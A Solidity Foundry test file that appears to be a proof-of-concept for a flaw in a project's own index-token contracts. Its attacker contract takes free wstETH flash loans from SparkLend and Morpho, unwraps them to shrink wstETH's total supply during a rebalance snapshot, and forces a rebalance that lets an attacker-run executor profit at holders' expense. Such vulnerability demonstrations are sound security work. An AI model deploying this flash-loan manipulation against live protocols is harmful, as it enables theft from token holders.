// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IndexToken} from "../../src/IndexToken.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IIndexToken} from "../../src/interfaces/IIndexToken.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {ISwapRouter02} from "../mocks/ISwapRouter02.sol";
import {ForkAddresses as A} from "../fork/ForkAddresses.sol";
import {ForkFeeds} from "../fork/ForkFeeds.sol";
import {RebalanceExecutorV3} from "../fork/RebalanceExecutorV3.sol";

interface IWstETH {
    function wrap(uint256 stETHAmount) external returns (uint256);
    function unwrap(uint256 wstETHAmount) external returns (uint256);
    function stETH() external view returns (address);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 ref)
        external;
}

/// @notice Unprivileged attacker: borrows wstETH for free (SparkLend premium 0, Morpho Blue free), unwraps it so
///         wstETH.totalSupply() drops, calls the permissionless startRebalance, wraps back and repays, all in one tx.
contract WstethSupplyShrinker {
    using SafeERC20 for IERC20;

    address constant SPARK_POOL = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IIndexToken internal _index;
    uint256 internal _morphoAmount;
    uint256 public supplyDuringSnapshot;

    function attack(IIndexToken index, uint256 sparkAmount, uint256 morphoAmount) external {
        _index = index;
        _morphoAmount = morphoAmount;
        IAaveV3Pool(SPARK_POOL).flashLoanSimple(address(this), WSTETH, sparkAmount, "", 0);
    }

    /// SparkLend callback (Aave v3 interface).
    function executeOperation(address, uint256 amount, uint256 premium, address, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == SPARK_POOL, "spark");
        IMorpho(MORPHO).flashLoan(WSTETH, _morphoAmount, "");
        IERC20(WSTETH).forceApprove(SPARK_POOL, amount + premium);
        return true;
    }

    /// Morpho Blue callback.
    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "morpho");
        uint256 all = IERC20(WSTETH).balanceOf(address(this));
        // Burn every wstETH we hold: totalSupply drops by `all`.
        IWstETH(WSTETH).unwrap(all);
        supplyDuringSnapshot = IERC20(WSTETH).totalSupply();
        _index.startRebalance(0);
        // Wrap the stETH back: totalSupply is restored.
        address steth = IWstETH(WSTETH).stETH();
        uint256 st = IERC20(steth).balanceOf(address(this));
        IERC20(steth).forceApprove(WSTETH, st);
        IWstETH(WSTETH).wrap(st);
        IERC20(WSTETH).forceApprove(MORPHO, assets);
    }
}

/// @notice The default whitelist lists wstETH with referenceSupply 0, so its market cap in a rebalance snapshot is the
///         live wstETH.totalSupply(), which any stranger moves by 35% inside one transaction for free.
contract WstethSupplyFlashTest is ForkFeeds {
    using SafeERC20 for IERC20;

    address constant SPARK_POOL = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant SPARK_AWSTETH = 0x12B54025C112Aa61fAce2CDB7118740875A566E9;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    IndexFactory factory;
    IIndexRule rule;
    address guardian = makeAddr("guardian");
    address alice = makeAddr("alice");
    address attackerEoa = makeAddr("attacker");
    address[] all7;

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(url);
        else vm.createSelectFork(url, blk);

        factory = new IndexFactory(address(this), guardian);
        rule = IIndexRule(factory.RULE());
        _pinFeedsToTheBlockClock();
        CompositeFeed wbtcFeed = new CompositeFeed(
            IAggregatorV3(A.BTC_USD_FEED), IAggregatorV3(A.WBTC_BTC_FEED), A.STALENESS_1H, A.STALENESS_24H
        );
        // The shipped default list, exactly as ConfigureWhitelist would propose it.
        ConfigureWhitelist cw = new ConfigureWhitelist();
        ConfigureWhitelist.Entry[] memory list = cw.defaultMainnetList(address(wbtcFeed));
        for (uint256 i = 0; i < list.length; ++i) {
            factory.proposeListing(list[i].token, cw.configFor(list[i]));
            all7.push(list[i].token);
        }
        assertEq(factory.pendingTokenConfig(A.WSTETH).referenceSupply, 0, "wstETH ships with on-chain supply");
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        for (uint256 i = 0; i < list.length; ++i) {
            factory.executeListing(list[i].token);
        }
    }

    // ------------------------------------------------------------------ helpers

    function _issue(IndexToken index, address[] memory tokens, address who, uint256 shares) internal {
        uint256[] memory need = index.previewIssue(shares);
        for (uint256 i = 0; i < tokens.length; ++i) {
            deal(tokens[i], who, need[i]); // deal does not touch totalSupply
        }
        vm.startPrank(who);
        for (uint256 i = 0; i < tokens.length; ++i) {
            IERC20(tokens[i]).forceApprove(address(index), need[i]);
        }
        index.issue(shares, who);
        vm.stopPrank();
    }

    function _nav(IndexToken index) internal view returns (uint256) {
        return rule.navPerToken(address(index)) * index.totalSupply() / 1e18;
    }

    function _flashAmounts() internal view returns (uint256 spark, uint256 morpho) {
        spark = IERC20(A.WSTETH).balanceOf(SPARK_AWSTETH);
        morpho = IERC20(A.WSTETH).balanceOf(MORPHO);
    }

    function _executor() internal returns (RebalanceExecutorV3 ex) {
        vm.startPrank(attackerEoa);
        ex = new RebalanceExecutorV3(IIndexFactory(address(factory)), ISwapRouter02(A.SWAP_ROUTER_02), A.WETH);
        ex.setFee(A.WSTETH, 100);
        ex.setFee(A.WBTC, 500);
        ex.setFee(A.LINK, 3000);
        ex.setFee(A.UNI, 3000);
        ex.setFee(A.AAVE, 3000);
        ex.setFee(A.WSOL, 3000);
        vm.stopPrank();
    }

    IndexToken internal _idx;

    /// Runs honest check, attack, then a lone attacker-executor fill at the 0.9 end multiplier through real V3 pools.
    function _scenario(string memory label, address[] memory tokens, uint8 methodology, uint256 shares)
        internal
        returns (uint256 turnoverAttack, int256 executorProfitUsd, int256 navLossUsd)
    {
        uint256[] memory units = rule.initialUnits(tokens, methodology, 1_000e18);
        _idx = IndexToken(factory.createIndex(label, label, tokens, units, methodology));
        _issue(_idx, tokens, alice, shares);
        vm.warp(block.timestamp + _idx.MIN_REBALANCE_INTERVAL());
        console2.log(label);
        uint256 honestTurnover = _honestRefused();
        _attack();
        turnoverAttack = _compare(tokens, honestTurnover);
        (executorProfitUsd, navLossUsd) = _fill();
    }

    function _honestRefused() internal returns (uint256 honestTurnover) {
        // Honest: the index sits on its rule, so a stranger's startRebalance is refused.
        (, honestTurnover) = _idx.previewTarget(0);
        console2.log("  honest turnover (1e18 = 100%)", honestTurnover);
        vm.expectRevert(abi.encodeWithSelector(IIndexToken.TurnoverTooLow.selector, honestTurnover));
        vm.prank(attackerEoa);
        _idx.startRebalance(0);
    }

    function _attack() internal {
        // Same block, same prices, only wstETH.totalSupply() is moved for the duration of the call.
        uint256 supplyBefore = IERC20(A.WSTETH).totalSupply();
        (uint256 sparkAmt, uint256 morphoAmt) = _flashAmounts();
        WstethSupplyShrinker shrinker = new WstethSupplyShrinker();
        deal(A.WSTETH, address(shrinker), 10); // 10 wei covers the wrap/unwrap share rounding
        vm.prank(attackerEoa);
        shrinker.attack(IIndexToken(address(_idx)), sparkAmt, morphoAmt);
        uint256 cost = 10 - IERC20(A.WSTETH).balanceOf(address(shrinker));
        console2.log("  wstETH supply before", supplyBefore / 1e18);
        console2.log("  wstETH supply seen by snapshot", shrinker.supplyDuringSnapshot() / 1e18);
        console2.log("  wstETH supply after", IERC20(A.WSTETH).totalSupply() / 1e18);
        console2.log("  attack cost in wstETH wei (excl. gas)", cost);
        assertApproxEqAbs(IERC20(A.WSTETH).totalSupply(), supplyBefore, 10, "supply restored to the wei rounding");
        assertLe(cost, 10, "manipulation is free apart from gas");
    }

    function _compare(address[] memory tokens, uint256 honestTurnover) internal view returns (uint256 turnoverAttack) {
        (uint256 eta,, uint256[] memory targets) = _idx.pendingRebalance();
        assertGt(eta, 0, "a stranger forced a rebalance");
        // What the rule says now that supply is back: the stored targets disagree with it.
        (uint256[] memory fair, uint256 fairTurnover) = _idx.previewTarget(0);
        assertEq(fairTurnover, honestTurnover);
        (, uint256[] memory cur) = _idx.components();
        for (uint256 i = 0; i < tokens.length; ++i) {
            console2.log("  component", i, tokens[i]);
            console2.log("    units / manipulated target / fair target", cur[i], targets[i], fair[i]);
        }
        turnoverAttack = _turnover(tokens, cur, targets);
        console2.log("  manipulated turnover (1e18 = 100%)", turnoverAttack);
        assertGe(turnoverAttack, _idx.MIN_TURNOVER());
    }

    function _fill() internal returns (int256 executorProfitUsd, int256 navLossUsd) {
        (uint256 eta,,) = _idx.pendingRebalance();
        RebalanceExecutorV3 ex = _executor();
        deal(A.WETH, address(ex), 2_000 ether);
        uint256 wethBefore = IERC20(A.WETH).balanceOf(address(ex));
        uint256 navBefore = _nav(_idx);
        vm.warp(eta + _idx.AUCTION_DURATION());
        assertEq(_idx.currentMultiplier(), 0.9e18);
        vm.prank(attackerEoa);
        ex.fill(IIndexToken(address(_idx)));
        uint256 navAfter = _nav(_idx);
        int256 wethDelta = int256(IERC20(A.WETH).balanceOf(address(ex))) - int256(wethBefore);
        executorProfitUsd = wethDelta * int256(rule.price(A.WETH)) / 1e18;
        navLossUsd = int256(navBefore) - int256(navAfter);
        console2.log("  NAV before fill (USD)", navBefore / 1e18);
        console2.log("  NAV after fill (USD)", navAfter / 1e18);
        console2.log("  holders' loss (USD, feed prices)", navLossUsd / 1e18);
        console2.log("  attacker-executor profit after real V3 swaps (USD)", executorProfitUsd / 1e18);
    }

    function _turnover(address[] memory tokens, uint256[] memory cur, uint256[] memory tgt)
        internal
        view
        returns (uint256)
    {
        uint256 sold;
        uint256 bought;
        uint256 value;
        for (uint256 i = 0; i < tokens.length; ++i) {
            uint256 p = rule.price(tokens[i]);
            value += cur[i] * p;
            if (tgt[i] < cur[i]) sold += (cur[i] - tgt[i]) * p;
            else bought += (tgt[i] - cur[i]) * p;
        }
        return (sold < bought ? sold : bought) * 1e18 / value;
    }

    // ------------------------------------------------------------------ tests

    function test_flashAvailability() public view {
        uint256 supply = IERC20(A.WSTETH).totalSupply();
        (uint256 s, uint256 m) = _flashAmounts();
        console2.log("wstETH totalSupply", supply / 1e18);
        console2.log("SparkLend wstETH cash (premium 0)", s / 1e18);
        console2.log("Morpho Blue wstETH balance (free)", m / 1e18);
        console2.log("Aave v3 core wstETH cash (5 bps)", IERC20(A.WSTETH).balanceOf(0x0B925eD163218f6662a35e0f0371Ac234f9E9371) / 1e18);
        console2.log("free share of supply (bps)", (s + m) * 10_000 / supply);
    }

    /// The shipped capped methodology over the whole launch list.
    function test_cappedLaunchIndex_strangerForcesRebalanceAndExecutorExtracts() public {
        (uint256 t, int256 profit, int256 loss) = _scenario("CAPPED-7", all7, 1, 10_000e18); // ~$10M NAV
        assertGt(t, 0.02e18, "at least 2% of NAV forced to trade");
        assertGt(loss, 0, "holders lose value");
        assertGt(profit, 0, "attacker-executor profits after swap costs");
    }

    /// An uncapped index over wstETH and the DeFi names.
    function test_uncappedDefiIndex_strangerForcesRebalanceAndExecutorExtracts() public {
        address[] memory t = new address[](4);
        t[0] = A.WSTETH;
        t[1] = A.LINK;
        t[2] = A.UNI;
        t[3] = A.AAVE;
        (uint256 turnover, int256 profit, int256 loss) = _scenario("DEFI-4", t, 0, 10_000e18);
        assertGt(turnover, 0.08e18, "at least 8% of NAV forced to trade");
        assertGt(loss, 0);
        assertGt(profit, 0);
    }
}
